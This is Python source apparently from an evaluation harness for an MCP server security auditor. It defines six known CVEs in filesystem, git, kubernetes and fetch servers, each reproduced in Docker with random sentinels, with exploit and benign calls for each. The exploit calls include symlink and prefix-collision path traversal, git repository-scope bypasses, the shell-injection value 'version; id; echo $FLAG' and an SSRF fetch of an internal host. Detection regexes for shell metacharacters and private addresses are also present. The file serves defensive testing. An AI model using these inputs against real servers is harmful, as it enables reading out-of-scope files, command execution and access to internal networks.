import re
import secrets
from collections.abc import Awaitable, Callable
from contextlib import AbstractContextManager
from dataclasses import dataclass
from pathlib import Path

from evals.cve_environments import (
    Launch,
    command_injection_env,
    filesystem_env,
    git_init_traversal_env,
    prefix_collision_env,
    repository_bypass_env,
    ssrf_env,
)
from evals.cve_grammar import MechanismClass
from mcp_auditor.domain.ports import MCPClientPort

# The filesystem CVEs surface the leak through a read tool, but the blind
# generator first needs list_directory to discover the planted symlink.
FILESYSTEM_READ_TOOLS = frozenset({"read_file", "list_directory"})

DOCKER_DIRECTORY = Path(__file__).parent / "docker"


def image_tag(name: str) -> str:
    return f"mcp-auditor-cve-{name}:local"


def image_dockerfile(name: str, docker_directory: Path = DOCKER_DIRECTORY) -> Path:
    return docker_directory / f"Dockerfile.{name}"


_KUBERNETES_IMAGE = image_tag("kubernetes")


@dataclass(frozen=True)
class CVETarget:
    cve_id: str
    severity: str
    sentinel: str
    mechanism: MechanismClass
    aim: re.Pattern[str]
    images: tuple[str, ...]  # services of evals/docker/compose.yml
    builder: Callable[..., AbstractContextManager[Launch]]
    builder_args: tuple[str, ...]  # passed before the sentinel
    exploit: Callable[[MCPClientPort], Awaitable[None]]
    benign: Callable[[MCPClientPort], Awaitable[None]]
    awaited_capability: str | None
    note: str
    tools_filter: frozenset[str] | None
    ci_skip_reason: str | None = None

    def environment(self) -> AbstractContextManager[Launch]:
        return self.builder(*self.builder_args, self.sentinel)


@dataclass(frozen=True)
class OutOfScopeCVE:
    cve_id: str
    severity: str
    reason: str


def _sentinel() -> str:
    return f"MCPAUDIT-{secrets.token_hex(16)}"


_SYMLINK_TRAVERSAL_SENTINEL = _sentinel()
_PREFIX_COLLISION_SENTINEL = _sentinel()
_REPOSITORY_BYPASS_SENTINEL = _sentinel()
_GIT_INIT_TRAVERSAL_SENTINEL = _sentinel()
_KUBERNETES_INJECTION_SENTINEL = _sentinel()
_FETCH_SSRF_SENTINEL = _sentinel()


async def _exploit_symlink_traversal(client: MCPClientPort) -> None:
    await client.call_tool("read_file", {"path": "/work/sandbox/report"})


async def _exploit_prefix_collision(client: MCPClientPort) -> None:
    await client.call_tool("read_file", {"path": "/work/sandbox_secret/flag.txt"})


async def _list_sandbox(client: MCPClientPort) -> None:
    await client.call_tool("list_directory", {"path": "/work/sandbox"})


async def _exploit_repository_bypass(client: MCPClientPort) -> None:
    await client.call_tool("git_log", {"repo_path": "/work/other"})


async def _benign_repository_bypass(client: MCPClientPort) -> None:
    await client.call_tool("git_log", {"repo_path": "/work/repo"})


async def _exploit_git_init_traversal(client: MCPClientPort) -> None:
    await client.call_tool("git_init", {"repo_path": "/work/secret"})
    await client.call_tool("git_add", {"repo_path": "/work/secret", "files": ["."]})
    await client.call_tool("git_diff_staged", {"repo_path": "/work/secret"})


async def _benign_git_init_traversal(client: MCPClientPort) -> None:
    await client.call_tool("git_diff_staged", {"repo_path": "/work/repo"})


async def _exploit_kubernetes_injection(client: MCPClientPort) -> None:
    await client.call_tool("kubectl_generic", {"command": "version; id; echo $FLAG"})


async def _benign_kubernetes_injection(client: MCPClientPort) -> None:
    await client.call_tool("kubectl_generic", {"command": "version"})


async def _exploit_fetch_ssrf(client: MCPClientPort) -> None:
    await client.call_tool("fetch_txt", {"url": "http://sentinel/"})


async def _benign_fetch_ssrf(client: MCPClientPort) -> None:
    await client.call_tool("fetch_txt", {"url": "http://example.invalid/"})


# The aims describe the flaw class from the published mechanism, not the planted instance,
# except 53109: its link is a name the server itself lists, so aiming at it already needs
# the discovery the CVE requires.
_PLANTED_LINK_AIM = re.compile(r"(^|/)report$")
_PREFIX_SIBLING_AIM = re.compile(r"^/work/sandbox[^/]")
_OUTSIDE_REPO_AIM = re.compile(r"^/(?!work/repo(/|$))")
_SHELL_METACHARACTER_AIM = re.compile(r"[;&|`]|\$\(")
# A URL whose host is loopback (shortened forms such as 127.1 included), link-local,
# RFC 1918, 0.0.0.0, [::1], an IPv6 unique local or IPv4-mapped address, or a
# single-label name. A public URL that redirects inward does not read as aimed, since
# the aim reads only the arguments sent: that affects the miss class alone, never a
# detection.
_INTERNAL_HOST_AIM = re.compile(
    r"^[a-z][a-z0-9+.-]*://(?:[^/?#@]*@)?"
    r"(?:127(?:\.\d{1,3}){1,3}"
    r"|169\.254(?:\.\d{1,3}){2}"
    r"|10(?:\.\d{1,3}){3}"
    r"|172\.(?:1[6-9]|2\d|3[01])(?:\.\d{1,3}){2}"
    r"|192\.168(?:\.\d{1,3}){2}"
    r"|0\.0\.0\.0"
    r"|\[::1\]"
    r"|\[fd[0-9a-f]{2}:[0-9a-f:]*\]"
    r"|\[::ffff:[0-9a-f.:]+\]"
    r"|[a-z0-9_-]+)"
    r"(?::\d+)?(?:[/?#]|$)",
    re.IGNORECASE,
)


# Each severity, here and in OUT_OF_SCOPE_CVES, is the CVSS score of the CVE record on
# cve.org, the CNA's or CISA-ADP's when the CNA gives none, with its version and source.
# Invariant for every target below: tools_filter must name the same real tool
# that exploit calls. A wrong name raises in filter_tools, so the run is
# reported as not_run rather than as a missed detection.
CVE_TARGETS: list[CVETarget] = [
    CVETarget(
        cve_id="CVE-2025-53109",
        severity="CVSS 7.3 (v4.0, CNA)",
        sentinel=_SYMLINK_TRAVERSAL_SENTINEL,
        mechanism=MechanismClass.READ_OUTSIDE_SCOPE,
        aim=_PLANTED_LINK_AIM,
        images=("filesystem",),
        builder=filesystem_env,
        builder_args=(),
        exploit=_exploit_symlink_traversal,
        benign=_list_sandbox,
        awaited_capability="cross-tool chains",
        note=(
            "Symlink inside the allowed dir; needs list_directory discovery then read_file. "
            "The current audit order (read_file before list_directory) neutralises "
            "cross-tool learning."
        ),
        tools_filter=FILESYSTEM_READ_TOOLS,
    ),
    CVETarget(
        cve_id="CVE-2025-53110",
        severity="CVSS 7.3 (v4.0, CNA)",
        sentinel=_PREFIX_COLLISION_SENTINEL,
        mechanism=MechanismClass.READ_OUTSIDE_SCOPE,
        aim=_PREFIX_SIBLING_AIM,
        images=("filesystem",),
        builder=prefix_collision_env,
        builder_args=(),
        exploit=_exploit_prefix_collision,
        benign=_list_sandbox,
        awaited_capability="declared-scope awareness",
        note="Prefix-collision sibling is derivable only from the declared boundary.",
        tools_filter=FILESYSTEM_READ_TOOLS,
    ),
    CVETarget(
        cve_id="CVE-2025-68145",
        severity="CVSS 6.4 (v4.0, CNA)",
        sentinel=_REPOSITORY_BYPASS_SENTINEL,
        mechanism=MechanismClass.READ_OUTSIDE_SCOPE,
        aim=_OUTSIDE_REPO_AIM,
        images=("git",),
        builder=repository_bypass_env,
        builder_args=(),
        exploit=_exploit_repository_bypass,
        benign=_benign_repository_bypass,
        awaited_capability="declared-scope awareness",
        note="--repository bypass needs the generator to aim outside the declared repo.",
        tools_filter=frozenset({"git_log"}),
    ),
    CVETarget(
        cve_id="CVE-2025-68143",
        severity="CVSS 6.5 (v4.0, CNA)",
        sentinel=_GIT_INIT_TRAVERSAL_SENTINEL,
        mechanism=MechanismClass.READ_OUTSIDE_SCOPE,
        aim=_OUTSIDE_REPO_AIM,
        images=("git",),
        builder=git_init_traversal_env,
        builder_args=(),
        exploit=_exploit_git_init_traversal,
        benign=_benign_git_init_traversal,
        awaited_capability="cross-tool chains + declared-scope awareness",
        note="git_init(out-of-scope) -> git_add(.) -> git_diff_staged surfaces the content.",
        tools_filter=frozenset({"git_init", "git_add", "git_diff_staged"}),
        ci_skip_reason=(
            "git_diff_staged hangs on GitHub-hosted runners (runner-specific, "
            "not reproducible locally); still covered by local calibration and the graded run"
        ),
    ),
    CVETarget(
        cve_id="CVE-2025-53355",
        severity="CVSS 7.5 (v3.1, CNA)",
        sentinel=_KUBERNETES_INJECTION_SENTINEL,
        mechanism=MechanismClass.COMMAND_EXECUTION,
        aim=_SHELL_METACHARACTER_AIM,
        images=("kubernetes",),
        builder=command_injection_env,
        builder_args=(_KUBERNETES_IMAGE,),
        exploit=_exploit_kubernetes_injection,
        benign=_benign_kubernetes_injection,
        awaited_capability=None,
        note=(
            "Command injection via kubectl_generic (execSync shell); "
            "surfaces the env sentinel with no cluster."
        ),
        tools_filter=frozenset({"kubectl_generic"}),
    ),
    CVETarget(
        cve_id="CVE-2025-65513",
        severity="CVSS 7.5 (v3.1, CISA-ADP)",
        sentinel=_FETCH_SSRF_SENTINEL,
        mechanism=MechanismClass.INTERNAL_FETCH,
        aim=_INTERNAL_HOST_AIM,
        images=("fetch", "sentinel"),
        builder=ssrf_env,
        builder_args=(),
        exploit=_exploit_fetch_ssrf,
        benign=_benign_fetch_ssrf,
        awaited_capability="declared-scope awareness",
        note="SSRF via is_ip_private bypass; a Docker sidecar serves the internal endpoint.",
        tools_filter=frozenset({"fetch_txt"}),
    ),
]


OUT_OF_SCOPE_CVES: list[OutOfScopeCVE] = [
    OutOfScopeCVE(
        cve_id="CVE-2025-68144",
        severity="CVSS 6.3 (v4.0, CNA)",
        reason=(
            "Argument injection (git_diff --output=/path) overwrites a file silently; "
            "nothing surfaces in a tool response, so it needs instrumented observation "
            "(ADR 011)."
        ),
    ),
]
